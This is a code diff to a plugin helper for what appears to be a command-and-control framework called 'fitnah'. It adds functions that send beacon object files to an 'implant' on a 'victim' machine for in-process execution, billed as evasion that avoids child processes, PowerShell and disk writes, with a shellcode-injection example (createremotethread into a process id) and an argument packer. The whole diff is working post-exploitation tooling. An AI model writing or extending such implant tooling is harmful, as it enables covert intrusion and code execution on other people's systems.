@@ -12,11 +12,18 @@ Usage inside a plugin:
         if result["status"] != "ok":
             return ModuleResult.err(result.get("output",""))
         return ModuleResult.ok(data=result["output"])
+
+BOF dispatch (native in-process execution, no PowerShell):
+    result = ctx.bof("createremotethread", pid=1234, shellcode_b64="...")
+    result = ctx.bof_raw(coff_bytes, args_b64="")
 """
 from __future__ import annotations
 
 import asyncio
+import base64
+import json
 import logging
+from pathlib import Path
 from typing import TYPE_CHECKING, Any
 
 if TYPE_CHECKING:
@@ -24,6 +31,20 @@ if TYPE_CHECKING:
     from fitnah.orchestration.session_manager import Session
 
 log = logging.getLogger(__name__)
+
+_BOF_ROOT = Path(__file__).resolve().parent.parent / "bofs"
+_MANIFEST: dict | None = None
+
+
+def _load_manifest() -> dict:
+    global _MANIFEST
+    if _MANIFEST is None:
+        manifest_path = _BOF_ROOT / "manifest.json"
+        if manifest_path.exists():
+            _MANIFEST = json.loads(manifest_path.read_text())
+        else:
+            _MANIFEST = {}
+    return _MANIFEST
 
 
 class PluginContext:
@@ -73,9 +94,92 @@ class PluginContext:
         """Shortcut — run a shell command."""
         return self.send("shell", {"cmd": cmd})
 
-    def ps(self, cmd: str) -> dict:
-        """Shortcut — run a PowerShell command."""
-        return self.send("shell", {"cmd": f"powershell -NoProfile -NonInteractive -Command \"{cmd}\""})
+    def ps(self, cmd: str, timeout: int | None = None) -> dict:
+        """Shortcut — run a PowerShell command (legacy; prefer bof() for evasion)."""
+        old = self._timeout
+        if timeout:
+            self._timeout = timeout
+        r = self.send("shell", {"cmd": f"powershell -NoProfile -NonInteractive -Command \"{cmd}\""})
+        self._timeout = old
+        return r
+
+    def bof(self, name: str, args_b64: str = "", arch: str = "x64", timeout: int = 60) -> dict:
+        """
+        Dispatch a named BOF from the fitnah/bofs/ library in-process on the implant.
+
+        The implant's BofExecute() runs the COFF in the current thread — no child
+        process, no PowerShell, no disk write.  BOF output is returned in result['output'].
+
+        Args:
+            name:      BOF name as it appears in manifest.json (e.g. 'whoami', 'createremotethread')
+            args_b64:  Base64-encoded packed argument buffer (BOF args_pack format). Empty = no args.
+            arch:      'x64' (default) or 'x86'
+            timeout:   Seconds to wait for ACK (default 60)
+        """
+        manifest = _load_manifest()
+        entry = manifest.get(name)
+        if not entry:
+            return {"status": "error", "output": f"BOF not found in library: {name}"}
+
+        bof_path = Path(__file__).resolve().parent.parent.parent / entry["path"]
+        if not bof_path.exists():
+            return {"status": "error", "output": f"BOF file missing: {bof_path}"}
+
+        coff_b64 = base64.b64encode(bof_path.read_bytes()).decode()
+        old_timeout = self._timeout
+        self._timeout = timeout
+        result = self.send("bof", {"coff_b64": coff_b64, "args_b64": args_b64})
+        self._timeout = old_timeout
+        return result
+
+    def bof_raw(self, coff_bytes: bytes, args_b64: str = "", timeout: int = 60) -> dict:
+        """
+        Dispatch an arbitrary COFF blob in-process (no manifest lookup).
+        Use this for custom BOFs not in the library.
+        """
+        coff_b64 = base64.b64encode(coff_bytes).decode()
+        old_timeout = self._timeout
+        self._timeout = timeout
+        result = self.send("bof", {"coff_b64": coff_b64, "args_b64": args_b64})
+        self._timeout = old_timeout
+        return result
+
+    @staticmethod
+    def bof_pack(fmt: str, *values) -> str:
+        """
+        Pack arguments into the BOF args buffer format and return base64.
+
+        Format chars (matches CS BOF convention):
+          b  — bytes  (prefixed with uint32 length)
+          i  — int32
+          s  — int16
+          z  — null-terminated ASCII string
+          Z  — null-terminated wide string
+          o  — bytes blob (prefixed with uint32 length, same as b)
+
+        Example:
+            args_b64 = ctx.bof_pack("zi", "notepad.exe", 1234)
+        """
+        import struct
+        buf = bytearray()
+        val_iter = iter(values)
+        for c in fmt:
+            v = next(val_iter)
+            if c in ("z",):
+                enc = (str(v) + "\x00").encode("utf-8")
+                buf += struct.pack("<I", len(enc)) + enc
+            elif c in ("Z",):
+                enc = (str(v) + "\x00").encode("utf-16-le")
+                buf += struct.pack("<I", len(enc)) + enc
+            elif c == "i":
+                buf += struct.pack("<i", int(v))
+            elif c == "s":
+                buf += struct.pack("<h", int(v))
+            elif c in ("b", "o"):
+                if isinstance(v, str):
+                    v = base64.b64decode(v)
+                buf += struct.pack("<I", len(v)) + bytes(v)
+        return base64.b64encode(bytes(buf)).decode()
 
     def upload(self, remote_path: str, data: bytes) -> dict:
         """Upload bytes to a path on the victim."""
